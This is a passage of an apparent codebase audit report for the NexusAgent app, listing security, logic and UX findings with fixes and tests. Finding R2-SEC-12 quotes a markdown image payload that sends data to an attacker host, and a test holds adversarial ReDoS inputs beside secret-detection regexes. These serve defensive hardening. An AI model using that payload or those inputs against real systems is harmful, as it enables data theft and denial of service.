# NexusAgent: Full Codebase Audit Report (Round 2)

- **Date:** 2026-10-30
- **Commit audited:** `ac1c4d9` (branch `master`, clean tree)
- **Scope:** every tracked file: `apps/backend`, `apps/frontend`, `packages/contracts`, `migrations`, `scripts`, `knowledge_base`, `.agents/**`, `.github`, root config. Tests were skimmed for coverage gaps, not line-audited.
- **Lenses:** security (web + OWASP Top 10 for Agentic AI), logic and correctness, UI/UX and accessibility, YAGNI / KISS / DRY / SOLID, dead and redundant code, CI/ops.
- **No application code was changed.** Only this file was written. The previous `report.md` (round 1, commit `a4e303d`) was fully actioned in earlier commits (`SEC-01..14`, `LOG-*`, `UX-*`, `CLN-*`) and is replaced by this one. Its findings are **not** repeated here. Recover it with `git show HEAD:report.md` if needed.

---

## 0. How to use this report

Two readers:

1. **Reviewer (human):** read §1 and §9 (decisions needed). Reject or change anything you disagree with.
2. **Fixer (Gemini 3.8 Flash):** apply **one finding ID per commit**, in the order of §8. Do not batch. Do not touch anything outside the finding.

Rules for the fixer:

- Each finding has **Where**, **Problem**, **Fix**, **Verify**. Do the **Fix** steps, then do **Verify**, then run the standard gates. Do not claim a finding is done until the gates pass.
- Line numbers refer to commit `ac1c4d9` and will drift. **Search for the quoted symbol, not the line number.**
- **Never edit an existing file in `migrations/`.** Applied migrations are immutable. Add a new file `YYYYMMDDHHMMSS_description.sql` with a timestamp later than `20261102000400` (the baseline's header says it squashes up to that version).
- When a fix deletes code, delete or update the tests that only covered that code. When a fix changes an API response, run `pnpm contracts:generate` and commit the regenerated `packages/contracts/openapi.json` and `src/generated.ts`.
- Add a regression test for every `SEC-*` and `LOG-*` fix.
- Keep the existing style: Python 3.14 (PEP 758 `except A, B:` is already used and valid), ruff line length 100, 4-space indent in TS, single quotes in TS, no new dependencies unless the finding says so.
- Items marked **DECISION** in §9 need a human answer first. Do not implement them on your own.
- IDs use the prefix `R2-` so they cannot be confused with the round-1 IDs that still appear in old commit messages and test names. Use `R2-SEC-01: <title>` as the commit subject.

Standard gates (run after every commit):

```bash
cd apps/backend && uv run pytest -q && uv run ruff check . && uv run ruff format --check .
pnpm --filter @nexusagent/frontend typecheck && pnpm lint && pnpm format:check && pnpm --filter @nexusagent/frontend test
```

Severity legend:

| Severity   | Meaning                                                                  |
| ---------- | ------------------------------------------------------------------------ |
| **High**   | Exploitable now, costs money, freezes the server, or breaks a core flow. |
| **Medium** | Real defect or risk with a narrower trigger or impact.                   |
| **Low**    | Hygiene, minor UX, small risk, or cleanup.                               |

---

## 1. Executive summary

### Baseline measured during this audit (before any fix)

| Check                          | Result                                                                                                                                                                       |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `uv run pytest -q`             | 119 passed, **20 skipped** (all `@pytest.mark.db`; they only run when `TEST_DATABASE_URL` is set). 3 warnings.                                                               |
| `uv run ruff check` / `format` | clean                                                                                                                                                                        |
| `pnpm --filter ... typecheck`  | clean                                                                                                                                                                        |
| `pnpm lint`                    | 6 warnings (`no-floating-promises` x3, `no-base-to-string` x3)                                                                                                               |
| `pnpm format:check`            | **FAILS** on 5 files. **CI is red on `master`** (see R2-OPS-02).                                                                                                             |
| `pnpm audit --prod`            | **38 vulnerabilities: 4 critical, 5 high, 20 moderate, 9 low** (`next@16.3.4`, `dompurify`, `katex`, `sharp`, `source-map-js`).                                              |
| `pip-audit` (backend `.venv`)  | `pyjwt 2.13.0` (15 advisories), `pillow 12.3.0` (39), `aiohttp`, `certifi`, `dnspython`, `nltk`, `setuptools`, `opentelemetry-api`. See R2-SEC-08 for the venv-drift caveat. |
| Secret scan of all 87 commits  | No real secrets. Only fixture strings in tests.                                                                                                                              |

### What is good (do not "fix" these; see Appendix A)

Parameterised SQL everywhere, per-user tenancy checks, local Google ID-token verification, revocable sessions, atomic quota SQL, nonce CSP, Mermaid `securityLevel: 'strict'` plus DOMPurify, the canary hold-back streaming logic, append-only audit trigger.

### Top problems

1. **A 1 MB upload can freeze the whole API for minutes** (quadratic regexes in the secret scrubber, R2-SEC-01) and **unauthenticated clients can push unlimited bytes** (multipart is parsed before auth, R2-SEC-02).
2. **Quota can be bypassed by aborting the stream** after retrieval/LLM work has started (R2-SEC-03).
3. **Embedding provider failure turns an upload into a 500 and still charges quota** (R2-LOG-01). On the Gemini free tier this is a routine event.
4. **Follow-up questions in a chat are refused as "out of scope"** because the scope guardrail ignores conversation history (R2-LOG-02). This breaks the headline multi-turn feature.
5. **Dependencies are behind on critical advisories** (R2-SEC-08) and **CI is red** (R2-OPS-02).
6. **Operational promises are not automated:** the privacy policy promises 24 h guest deletion and 30-day audit deletion, but nothing in the repo schedules the job (R2-OPS-01).

### Finding index

| ID        | Sev    | Title                                                                                 |
| --------- | ------ | ------------------------------------------------------------------------------------- |
| R2-SEC-01 | High   | Quadratic regexes in the secret scrubber freeze the server (ReDoS)                    |
| R2-SEC-02 | High   | Request bodies are unbounded and parsed before authentication                         |
| R2-SEC-03 | High   | Quota bypass: refund on client abort after work was done                              |
| R2-SEC-04 | Medium | `get_current_user_optional` ignores session revocation                                |
| R2-SEC-05 | Medium | Client-IP keying breaks behind a proxy (shared IP, or spoofable X-Forwarded-For)      |
| R2-SEC-06 | Medium | Abuse counters, MCP sessions and upload locks live in process memory                  |
| R2-SEC-07 | Medium | Upload limit and duplicate check are racy (no DB-level enforcement)                   |
| R2-SEC-08 | Medium | Vulnerable dependencies (Next.js, DOMPurify, PyJWT, Pillow, ...)                      |
| R2-SEC-09 | Low    | API response hardening: no `nosniff`/`no-store`, localhost in default production CORS |
| R2-SEC-10 | Low    | HSTS `preload` and `includeSubDomains` hard-coded                                     |
| R2-SEC-11 | Low    | Guest `deviceId` unbounded; weak fallback RNG for the device secret                   |
| R2-SEC-12 | Low    | Markdown renderer relies on CSP alone to block image exfiltration                     |
| R2-LOG-01 | High   | Upload: embedding failure is an unhandled 500 and quota is not refunded               |
| R2-LOG-02 | Medium | Scope guardrail refuses follow-ups and many valid architecture questions              |
| R2-LOG-03 | Medium | HNSW + `WHERE` filter can silently under-return rows                                  |
| R2-LOG-04 | Medium | Chunk endpoints load every chunk with its embedding to return one                     |
| R2-LOG-05 | Medium | Re-seeding changes chunk ids and breaks stored citations                              |
| R2-LOG-06 | Medium | Conversation switch race: a slow response overwrites the newer selection              |
| R2-LOG-07 | Medium | Persistence failure is invisible to the user                                          |
| R2-LOG-08 | Low    | Quota read path duplicates and races the SQL replenish logic                          |
| R2-LOG-09 | Low    | `last_seen_at` is written on every request (twice on `/auth/me`)                      |
| R2-LOG-10 | Low    | `/api/rag/search` charges quota before validating input                               |
| R2-LOG-11 | Low    | `/api/auth/refresh` is never called; sessions die silently after 24 h                 |
| R2-LOG-12 | Low    | MCP: unknown or malformed tool names are charged, mis-audited, or 500                 |
| R2-LOG-13 | Low    | `/api/health` runs three DB queries per unauthenticated call                          |
| R2-LOG-14 | Medium | Missing indexes and constraints; dead `hitl_approved` column                          |
| R2-UX-01  | Medium | Composer has no length limit or counter (server limit is 2000)                        |
| R2-UX-02  | Medium | Expired session logs the user out with no explanation                                 |
| R2-UX-03  | Medium | Mobile: quota hidden, `100vh` layout, `NaN%` quota bar                                |
| R2-UX-04  | Low    | Signing in from a guest session silently abandons guest uploads                       |
| R2-UX-05  | Low    | Accessibility noise: redundant roles, `!important` focus outline                      |
| R2-UX-06  | Low    | End-user UI shows internal jargon and a wrong protocol label ("MCP v2")               |
| R2-UX-07  | Low    | Arbitrary pixel values violate the project's own rule                                 |
| R2-UX-08  | Low    | Theme toggle performs side effects inside a state updater                             |
| R2-UX-09  | Low    | Chat search is title-only on the client while the server search is unused             |
| R2-CLN-01 | Medium | Backend dead and redundant code (list)                                                |
| R2-CLN-02 | Low    | Frontend dead code and unused exports (list)                                          |
| R2-CLN-03 | Medium | Hand-written wire mappers (DRY): use a camelCase base model                           |
| R2-CLN-04 | Low    | Message cache logic duplicated in four places                                         |
| R2-CLN-05 | Low    | Graph topology duplicated in `routes/agent.py`                                        |
| R2-CLN-06 | Medium | `generate_agent_stream` and route-to-route imports violate SRP/DIP                    |
| R2-CLN-07 | Low    | `parser.py` duplicated chunk construction and double search                           |
| R2-CLN-08 | Low    | Placeholder scaffolding files with `TODO` content                                     |
| R2-CLN-09 | Low    | MCP resource table duplicated and incomplete                                          |
| R2-CLN-10 | Low    | `seed_kb.py` duplicates the document insert SQL                                       |
| R2-OPS-01 | Medium | Retention job (privacy promise) is not scheduled anywhere                             |
| R2-OPS-02 | Medium | CI is red: `format:check` fails on 5 files; lint warnings                             |
| R2-OPS-03 | Medium | CI skips every DB test unless a secret is present                                     |
| R2-OPS-04 | Low    | CI hygiene: unpinned actions, no permissions, no audit job                            |
| R2-OPS-05 | Low    | Application logging is not configured; `INFO` logs are dropped                        |
| R2-DOC-01 | Low    | Documentation drift (Turborepo, pnpm version, test file names, stubs)                 |
| R2-TST-01 | Medium | Missing tests for the riskiest frontend modules and for adversarial inputs            |

---

## 2. Security findings

### R2-SEC-01 · High · Quadratic regexes in the secret scrubber freeze the server (ReDoS)

- **Where:** `apps/backend/app/core/security_guardrails.py`, `SECRET_PATTERNS` (private key, JWT, database URI entries). Called from `app/rag/parser.py::parse_markdown` on the **entire** uploaded text, and from `sanitize_retrieved_chunks`.
- **Problem:** Three patterns scan to the end of the run from every possible start position, so adversarial text is O(n²). Python's `re` holds the GIL, and `asyncio.to_thread` does not help, so the event loop stops serving every other request. Measured on this machine with `scrub_sensitive_information`:

    | Input (repeated string)            | 40 KB  | 80 KB  | extrapolated to the 1 MB upload limit |
    | ---------------------------------- | ------ | ------ | ------------------------------------- |
    | `"eyJ-"` (JWT pattern)             | 0.30 s | 1.21 s | **~3.5 minutes**                      |
    | `"postgres://a:"` (DB URI pattern) | 0.68 s | 2.54 s | **~7 minutes**                        |
    | `"-----BEGIN PRIVATE KEY-----"`    | 0.21 s | 0.89 s | **~2.5 minutes**                      |

    Any signed-in user (a guest is enough) can upload such a file. The quota cost is one token.

- **Fix:** Replace the three entries (keep the replacement strings unchanged). Every quantifier is bounded, and a lookbehind makes matching start only at the beginning of a token, so the work is linear:

    ```python
    # Private key: the body may not contain "--", so a stray BEGIN header cannot scan to the end of the file.
    (
        re.compile(
            r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"
            r"(?:[^-]|-(?!--)){0,16384}?"
            r"-----END (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"
        ),
        "[REDACTED_PRIVATE_KEY]",
    ),
    # JWT: only start at the beginning of a token, bounded segments.
    (
        re.compile(
            r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,8192}"
            r"\.[A-Za-z0-9_-]{10,8192}\.[A-Za-z0-9_-]{10,8192}(?![A-Za-z0-9_-])"
        ),
        "[REDACTED_JWT_TOKEN]",
    ),
    # Database URI with credentials: bounded user and password.
    (
        re.compile(
            r"(?<![A-Za-z0-9])(postgresql|postgres|mysql|mongodb|redis)://"
            r"([^:\s@/]{1,128}):([^@\s]{1,256})@"
        ),
        r"\1://\2:[REDACTED_PASSWORD]@",
    ),
    ```

    I benchmarked these exact shapes at 1 MB of adversarial input: JWT 0.01 s, DB URI 0.23 s, private key 0.004 s. Leave the other patterns alone (measured linear).

- **Verify:** Add `apps/backend/tests/test_scrubber_performance.py`:

    ```python
    import time

    import pytest

    from app.core.security_guardrails import scrub_sensitive_information

    ADVERSARIAL = {
        "jwt": "eyJ-" * 262_144,
        "dburi": "postgres://a:" * 80_000,
        "privkey": "-----BEGIN PRIVATE KEY-----" * 38_000,
        "sk": "sk-" * 350_000,
    }


    @pytest.mark.parametrize("name", ADVERSARIAL)
    def test_scrubber_is_linear_on_adversarial_input(name):
        started = time.perf_counter()
        scrub_sensitive_information(ADVERSARIAL[name], preserve_lines=True)
        assert time.perf_counter() - started < 2.0
    ```

    The existing redaction tests (`test_security_hitl.py`, `test_documents.py`) must still pass: a real JWT, an RSA key block, an `AKIA...` key and `postgresql://admin:pw@host/db` are still redacted, and `preserve_lines=True` still keeps the newline count.

### R2-SEC-02 · High · Request bodies are unbounded and parsed before authentication

- **Where:** `apps/backend/app/main.py` (no body-size middleware), `app/routes/documents.py::upload_document` (the 1 MB check happens after Starlette has already received and spooled the whole multipart body).
- **Problem:** FastAPI parses the form body **before** it resolves `Depends(get_current_user)`. Verified with a probe: a 5 MB unauthenticated multipart POST returned `401` only after `['body-parsed', 'auth']` ran in that order. An anonymous client can stream gigabytes into the server's memory/temp disk. The later `file.read(MAX_FILE_BYTES + 1)` does not help.
- **Fix:** Add a pure-ASGI middleware `app/core/body_limit.py` and register it in `main.py` **before** `CORSMiddleware`.
    1. Limits: `POST /api/documents/upload` -> `1_048_576 + 16_384` bytes; every other path -> `65_536` bytes. Put the table in `settings` (`MAX_UPLOAD_REQUEST_BYTES`, `MAX_JSON_REQUEST_BYTES`).
    2. If `Content-Length` is present and larger than the limit, answer `413 {"detail": "Request body too large"}` without calling the app. If it is not an integer, answer `400`.
    3. For chunked bodies (no `Content-Length`), wrap `receive`, add up `len(message.get("body", b""))` for `http.request` messages, and when the total passes the limit raise an internal exception that the middleware turns into the same `413` (only if the response has not started).
    4. Only handle `scope["type"] == "http"`; pass everything else through.
    5. Use `status.HTTP_413_CONTENT_TOO_LARGE` (the old constant is deprecated; see R2-TST-02).
    6. Document in `README.md` (Deployment) that the reverse proxy should also cap bodies (for example Cloudflare or nginx `client_max_body_size 2m`).
- **Verify:** New `tests/test_body_limit.py` (no DB needed): (a) unauthenticated POST of 3 MB to `/api/documents/upload` returns `413`, and `MultiPartParser.parse` was never called (monkeypatch it to record calls); (b) a chunked 3 MB body (httpx streaming generator) returns `413`; (c) a 100 KB JSON body to `/api/agent/stream` returns `413`; (d) a normal 200 KB upload still reaches the handler.

### R2-SEC-03 · High · Quota bypass: refund on client abort after work was done

- **Where:** `apps/backend/app/routes/agent.py::generate_agent_stream`, `run_pipeline` -> `except asyncio.CancelledError` (`if not tokens_sent: await refund_if_charged()`), and the generic `except Exception` branch.
- **Problem:** The token is refunded when the client disconnects before the first model token. By then the server has already run the planner, the **embedding API call**, two database searches, an audit write, and has started the Gemini request. A script that opens `/api/agent/stream`, waits for the `tool_result` event, and closes the connection gets the work for free, indefinitely. Guests are protected by the separate per-IP counter, but **Google users have no other limiter**, so their 25/hour quota is meaningless against this.
- **Fix:**
    1. In `except asyncio.CancelledError`, **remove** the refund. Keep only `logger.info` and `raise`.
    2. In `except Exception` keep the refund only `if not tokens_sent` (a server fault before any output).
    3. In the `final_state.error` branch keep the refund only `if not tokens_sent`. Errors such as "no model configured" or "all models rate limited" happen before any output, so they stay refundable.
    4. Update the comment above the cancel branch to say why (retrieval and the model call may already have run).
- **Verify:** Add a test next to `tests/test_agent_stream.py`: start the stream with a fake graph that emits `tool_result`, cancel the generator, assert the user's remaining quota is **one lower** than before. Keep (or add) a test that a pre-work server error still refunds.

### R2-SEC-04 · Medium · `get_current_user_optional` ignores session revocation

- **Where:** `apps/backend/app/core/auth.py`, `get_current_user_optional` (used by `GET /api/documents`).
- **Problem:** `get_current_user` rejects tokens whose `tv` (token version) no longer matches, so logout revokes the session. The optional variant skips that check, so a token that was signed out still returns the user's private document list (filenames, hashes, ids). Two code paths also duplicate the decode-and-load logic.
- **Fix:** Extract one helper and use it in both dependencies:

    ```python
    async def _resolve_user(credentials: HTTPAuthorizationCredentials, db: NeonDatabase) -> User:
        # body of today's get_current_user up to and including the token_version check; raises HTTPException(401)
        ...

    async def get_current_user(credentials=Security(security_bearer), db=Depends(get_db)) -> User:
        if not credentials:
            raise HTTPException(401, ...)          # keep the existing detail and headers
        user = await _resolve_user(credentials, db)
        await db.touch_user(user.id)               # see R2-LOG-09; until then keep update_user_last_seen
        return user

    async def get_current_user_optional(credentials=Security(security_bearer), db=Depends(get_db)) -> User | None:
        if not credentials:
            return None
        try:
            return await _resolve_user(credentials, db)
        except HTTPException:
            return None
    ```

- **Verify:** Test: sign in as a guest, upload a document, call `POST /api/auth/logout`, then `GET /api/documents` with the old token. Expect only seeded documents (the user's upload must not be listed).

### R2-SEC-05 · Medium · Client-IP keying breaks behind a proxy

- **Where:** `apps/backend/app/core/auth.py::get_client_ip`, `app/config.py::TRUST_PROXY_HEADERS`, `.env.example`.
- **Problem:** Two failure modes. (a) With the default `TRUST_PROXY_HEADERS=false` behind any reverse proxy or Cloudflare (the privacy page says Cloudflare is used), every user has the proxy's IP, so the guest limits (`GUEST_SIGNUPS_PER_IP_PER_HOUR=5`, `GUEST_IP_QUOTA_PER_HOUR=15`) become **global**: the sixth visitor in an hour cannot get a guest pass. (b) With `true`, the code takes the **left-most** `X-Forwarded-For` entry, which is the part the client controls, so rotating the header evades every IP limit.
- **Fix:** Replace the boolean with a hop count and take the entry the trusted proxy added:
    1. `settings.TRUSTED_PROXY_HOPS: int = 0` (remove `TRUST_PROXY_HEADERS` and update `.env.example`, README, tests).
    2. In `get_client_ip`: if `hops > 0`, split `X-Forwarded-For` on `,`, strip, and return `parts[-hops]` when `len(parts) >= hops`; otherwise fall back to the socket address. Never use `parts[0]`.
    3. Log one `WARNING` at startup when `ENVIRONMENT` is not dev and `TRUSTED_PROXY_HOPS == 0`: "IP-based limits use the socket address; set TRUSTED_PROXY_HOPS if you run behind a proxy."
- **Verify:** Update `tests/test_security_hardening.py`: with `hops=1` and header `"1.1.1.1, 9.9.9.9"` the IP is `9.9.9.9`; with `hops=2` it is `1.1.1.1`; with `hops=0` the header is ignored; a short header with `hops=3` falls back to the socket IP.

### R2-SEC-06 · Medium · Abuse counters, MCP sessions and upload locks live in process memory

- **Where:** `app/core/rate_limiter.py` (`SlidingWindowCounter` x4), `app/routes/mcp.py::SESSIONS`, `app/routes/documents.py::_UPLOAD_LOCKS`, `app/agent/model_router.py`.
- **Problem:** With more than one worker or instance every per-IP limit multiplies by the worker count, MCP `POST /messages` can land on a worker that does not hold the SSE session (404), and the upload lock stops protecting anything. The README says "run a single process" but nothing enforces it, and `uvicorn --workers N` or a platform autoscaler silently breaks the limits. See **DECISION D3** in §9.
- **Fix (minimum, always do this):** In `main.py::lifespan`, read `os.environ.get("WEB_CONCURRENCY")`; if it is set and `> 1`, raise `RuntimeError("NexusAgent keeps abuse counters and MCP sessions in memory; run exactly one worker (see README).")` in production. Add the same sentence to `README.md` -> Deployment.
- **Fix (if D3 = "make it stateless"):** Replace `SlidingWindowCounter` with one table and one SQL statement (also deletes the `MAX_TRACKED_KEYS` pruning code):

    ```sql
    CREATE TABLE ip_rate_events (
        bucket TEXT NOT NULL, key TEXT NOT NULL, window_start TIMESTAMPTZ NOT NULL, hits INT NOT NULL DEFAULT 0,
        PRIMARY KEY (bucket, key, window_start)
    );
    ```

    ```python
    async def hit_ip_limit(self, bucket: str, key: str, limit: int) -> bool:
        row = await conn.fetchval(
            "INSERT INTO ip_rate_events (bucket, key, window_start, hits) VALUES ($1, $2, date_trunc('hour', NOW()), 1) "
            "ON CONFLICT (bucket, key, window_start) DO UPDATE SET hits = ip_rate_events.hits + 1 RETURNING hits;",
            bucket, key)
        return row <= limit
    ```

    Delete rows older than 2 hours inside `scripts/prune_guests.py`. Tests: replace the in-process fixtures accordingly.

- **Verify:** Unit test for the `WEB_CONCURRENCY` guard (production + `WEB_CONCURRENCY=2` raises; dev does not). If the DB version was done: a `db` test that the 6th hit in the same hour returns `False`.

### R2-SEC-07 · Medium · Upload limit and duplicate check are racy

- **Where:** `apps/backend/app/routes/documents.py::upload_document` (`count_user_documents` then insert; `get_document_by_hash` then insert), `_get_upload_lock`, `migrations/`.
- **Problem:** The per-user `asyncio.Lock` is per process (R2-SEC-06) and the DB enforces nothing: two concurrent requests can pass the `MAX_DOCUMENTS_PER_USER` check together, and the same file can be stored twice because there is no unique index on `(user_id, sha256_hash)`.
- **Fix:**
    1. New migration `20261103000000_document_constraints.sql`: first remove existing duplicates (`DELETE FROM documents d USING documents d2 WHERE d.user_id = d2.user_id AND d.sha256_hash = d2.sha256_hash AND d.uploaded_at > d2.uploaded_at;` chunks cascade), then `CREATE UNIQUE INDEX IF NOT EXISTS idx_documents_user_hash ON documents(user_id, sha256_hash) WHERE user_id IS NOT NULL;`.
    2. In `NeonDatabase.create_document_with_chunks`, inside the existing transaction and **before** the insert, take `SELECT pg_advisory_xact_lock(hashtext($1::text))` on the user id, re-count the user's documents, and raise a new `DocumentLimitReached` exception when the limit is hit. Catch `asyncpg.UniqueViolationError` and return the existing document (the same behaviour as the dedup branch).
    3. In the route map `DocumentLimitReached` to the existing `409` response. Keep the early count check as a cheap fast path, then **delete** `_UPLOAD_LOCKS`, `_get_upload_lock` and the `409 Upload already in progress` branch (YAGNI once the DB is the authority). Remove the tests that only cover the lock and replace them with a concurrency test.
- **Verify:** `db` test: fire 5 concurrent uploads of different files for a user with `MAX_DOCUMENTS_PER_USER - 1` documents; exactly one succeeds, the rest get `409`. Second test: two concurrent uploads of the same file produce exactly one row.

### R2-SEC-08 · Medium · Vulnerable dependencies

- **Where:** `apps/frontend/package.json`, `pnpm-lock.yaml`, `apps/backend/pyproject.toml`, `apps/backend/uv.lock`.
- **Problem:** `pnpm audit --prod` reports 4 critical and 5 high. Highlights: `next@16.3.4` (RCE in `next/og`, in the Image Optimization API with SVG, in `use cache`; DoS in Server Actions; SSRF in image optimization; patched in `>=16.4.1`), `dompurify` pinned at `3.2.6` plus a second copy under `mermaid` (many bypasses, patched in `>=3.4.17`), `katex <0.18.2`, `sharp`, `source-map-js`. The app does not use `next/og` or `use cache`, but the image endpoint is on by default, so patch anyway. Backend: `pyjwt 2.13.0` (15 advisories, the auth library; fixed `>=2.15.0`), `pillow 12.3.0` (39 advisories, fixed in 13.0.0), `aiohttp`, `certifi`, `dnspython`, `nltk`, `setuptools`, `opentelemetry-api`.
  **Caveat:** `pip-audit` ran against the local `.venv`, which also contains `fastmcp`, `authlib` and `langgraph-sdk` that are **not** in `uv.lock`. The venv has drifted from the lockfile. Re-run the audit after `uv sync --frozen`.
- **Fix:**
    1. Frontend: `pnpm --filter @nexusagent/frontend up next@latest` (must be `>=16.4.1`), set `dompurify` to `^3.4.17`, and add a `pnpm.overrides` / `overrides` entry in `pnpm-workspace.yaml` forcing `dompurify@<3.4.17` to `3.4.17` so the copy under `mermaid` is fixed too. Run `pnpm up mermaid katex`. Run `pnpm audit --prod` until no critical/high remain.
    2. Backend: `cd apps/backend && uv lock --upgrade-package pyjwt --upgrade-package pillow --upgrade-package aiohttp --upgrade-package certifi --upgrade-package dnspython --upgrade-package nltk --upgrade-package setuptools --upgrade-package opentelemetry-api`, then `uv sync --frozen`, then re-run `uv run --with pip-audit pip-audit --skip-editable`. Set `pyjwt[crypto]>=2.15.0` in `pyproject.toml`.
    3. Run the full test suites. If a major bump breaks something, fix the break; do not pin back.
    4. Add the audit job from R2-OPS-04 so this does not regress.
- **Verify:** `pnpm audit --prod --audit-level=high` exits 0; `pip-audit` reports nothing for `pyjwt`; all gates green.

### R2-SEC-09 · Low · API response hardening

- **Where:** `apps/backend/app/main.py`, `app/config.py` (`CORS_ORIGINS` default).
- **Problem:** (a) API responses carry no `X-Content-Type-Options: nosniff`, and auth responses (tokens in JSON) carry no `Cache-Control: no-store`. (b) The default `CORS_ORIGINS` includes `http://localhost:3000` and `http://127.0.0.1:3000` even when `ENVIRONMENT=production`.
- **Fix:** (a) Add a small `@app.middleware("http")` (or a pure-ASGI one) that sets `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer` on every response, and `Cache-Control: no-store` when the path starts with `/api/auth/`. (b) Make the default `CORS_ORIGINS` the production origin only; add the localhost origins in the `model_validator` when `is_dev`.
- **Verify:** Test that `/api/health` has `nosniff`, `/api/auth/guest` has `no-store`, and that `Settings(ENVIRONMENT="production", ...)` has no localhost origin while `development` does.

### R2-SEC-10 · Low · HSTS `preload` and `includeSubDomains` hard-coded

- **Where:** `apps/frontend/next.config.ts`, `securityHeaders`.
- **Problem:** `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` is sent on every deployment, including previews. `preload` is a commitment for the whole registrable domain and is meant to be opt-in; `includeSubDomains` on `nexusagent.avinaba.com` is harmless today but is a trap for the other `avinaba.com` services the privacy page mentions.
- **Fix:** Send `max-age=31536000` only. Add `includeSubDomains; preload` behind an explicit env flag (`HSTS_PRELOAD=true`) that is off by default. Do not send HSTS at all when `NODE_ENV !== 'production'`.
- **Verify:** Unit test of the header builder (extract a tiny function) for the three cases.

### R2-SEC-11 · Low · Guest `deviceId` unbounded; weak fallback RNG

- **Where:** `app/db/models.py::GuestPassRequest`, `apps/frontend/lib/auth-store.ts::getOrCreateDeviceId`.
- **Problem:** The device id is the credential that re-opens a guest account. The backend accepts any length. The frontend falls back to `Math.random().toString(36)` (about 50 bits, predictable) when `crypto.randomUUID` is missing (insecure contexts).
- **Fix:** `deviceId: str | None = Field(default=None, min_length=16, max_length=128)`. In the frontend, build the fallback from `crypto.getRandomValues(new Uint8Array(16))` hex-encoded, and if neither crypto API exists return `''` so the server generates one.
- **Verify:** Backend test: a 10 000-character `deviceId` returns `422`. Frontend test of the fallback path with `crypto.randomUUID` stubbed away.

### R2-SEC-12 · Low · Markdown renderer relies on CSP alone to block image exfiltration

- **Where:** `apps/frontend/components/canvas/MarkdownRenderer.tsx`, `components` map.
- **Problem:** `![x](https://attacker/?d=...)` in model output renders an `<img>`. Today the CSP `img-src` blocks it, but a CSP change or a deployment without `proxy.ts` would turn this into a data exfiltration channel (prompt injection is a stated threat).
- **Fix:** Add `img: () => null,` to the `components` map (the app shows no images in answers).
- **Verify:** Test in `MarkdownRenderer.test.tsx`: content `![a](https://example.com/x.png)` renders no `<img>`.

---

## 3. Logic and correctness findings

### R2-LOG-01 · High · Upload: embedding failure is an unhandled 500 and quota is not refunded

- **Where:** `apps/backend/app/routes/documents.py::upload_document` (`await default_embedding_service.get_embeddings(texts)`), `app/rag/embeddings.py`, `app/core/rate_limiter.py::refund`, `app/db/neon.py::refund_rate_limit`.
- **Problem:** `get_embeddings` raises `RuntimeError` on any HTTP error, timeout or short batch. The route never catches it, so the client gets a bare `500`, and the quota (`cost` tokens, charged just before) is lost. The Gemini free tier rate-limits embeddings routinely, so this is a common path. There is also no retry, a new `httpx.AsyncClient` per call, and batches run sequentially with a 10 s timeout each. `refund_rate_limit` can only return 1 token.
- **Fix:**
    1. `embeddings.py`: introduce `class EmbeddingUnavailable(RuntimeError)`; raise it instead of the bare `RuntimeError` (it is a subclass, so `hybrid_search` keeps working). Retry up to 2 more times with 0.5 s then 1.5 s backoff on `429` and `5xx` only. Reuse one module-level `httpx.AsyncClient` (create lazily, close in `lifespan`).
    2. `refund_rate_limit(user_id, amount=1)`: `LEAST(tokens_remaining + $2, bucket_capacity)`. `TokenBucketLimiter.refund(user_id, amount=1)`; also delete the unused `is_guest` parameter.
    3. `upload_document`: wrap everything after `check_and_consume` (embedding and `create_document_with_chunks`) in `try/except`. On `EmbeddingUnavailable` refund `cost` and raise `HTTPException(503, "Embedding service is busy. Nothing was charged; try again in a minute.")` with `Retry-After: 30`. On any other exception refund `cost` and re-raise.
- **Verify:** Test with `get_embeddings` patched to raise `EmbeddingUnavailable`: response is `503` with the message above and the user's remaining quota equals the value before the call. Test for the retry (first two calls `429`, third `200`) in `test_hybrid_search.py` using `httpx.MockTransport`.

### R2-LOG-02 · Medium · Scope guardrail refuses follow-ups and many valid architecture questions

- **Where:** `apps/backend/app/agent/graph.py::classify_query_intent`, `ARCHITECTURE_KEYWORDS`; `app/routes/agent.py::stream_agent_execution` and `generate_agent_stream` (classifies twice).
- **Problem:** (a) Intent is computed from the current message only. In a saved conversation, "explain that in more detail", "why?", "show it as a diagram" are classified `out_of_scope` and answered with the refusal, even though the product advertises multi-turn context. (b) The keyword list is exact-word (plus optional `s`), so "scalable", "leader election", "B-tree vs LSM", "Postgres vs MySQL isolation levels", "idempotency" are refused. (c) The query is classified twice (once in the route for metering, once in `generate_agent_stream`).
- **Fix:**
    1. `classify_query_intent(query: str, *, has_history: bool = False) -> Intent`. If the keyword/greeting check says `out_of_scope` **and** `has_history` **and** the query has at most 25 words, return `"architectural"` (it is metered like any question).
    2. In `stream_agent_execution`, load `chat_history` **first**, then compute `intent = classify_query_intent(payload.query, has_history=bool(chat_history))` once, use it for the metering decision, and pass it into `generate_agent_stream(..., intent=intent)`. Delete the second call inside `generate_agent_stream` (`intent=classify_query_intent(query)`).
    3. Add this sentence to `ANALYSIS_PROMPT`: "If the latest user message is unrelated to systems architecture, distributed systems or AI model benchmarks and is not a follow-up to the conversation, decline in one sentence."
    4. Extend `ARCHITECTURE_KEYWORDS` with stems and terms (the regex already allows a trailing `s`; for stems add a trailing `\w*` variant): `scalab`, `leader election`, `election`, `b-tree`, `lsm`, `index`, `transaction`, `isolation`, `idempoten`, `eventual`, `partition`, `rate limit`, `throttl`, `queue`, `postgres`, `mysql`, `sql`, `nosql`, `observab`, `kubernetes`, `docker`, `latency`, `throughput`, `trade-off`, `tradeoff`.
- **Verify:** Table-driven test with at least 20 in-scope and 10 out-of-scope prompts (out of scope: "write a poem", "capital of France", "recipe for pasta", ...). Test that with `has_history=True`, "explain that in more detail" is `architectural`, and without history it is `out_of_scope`. Test that a single request calls the classifier once.

### R2-LOG-03 · Medium · HNSW + `WHERE` filter can silently under-return rows

- **Where:** `apps/backend/app/db/neon.py::search_chunks_dense`.
- **Problem:** pgvector applies the HNSW index first (default `ef_search = 40`) and filters afterwards. With a growing seeded corpus plus per-user documents, the 40 nearest candidates may all belong to other documents or the wrong `embedding_model`, so a user's own document returns **zero** dense results although it is relevant. The system then degrades to lexical-only without any signal.
- **Fix:** Run the query in a transaction and enable iterative scans (pgvector `>=0.8`):

    ```python
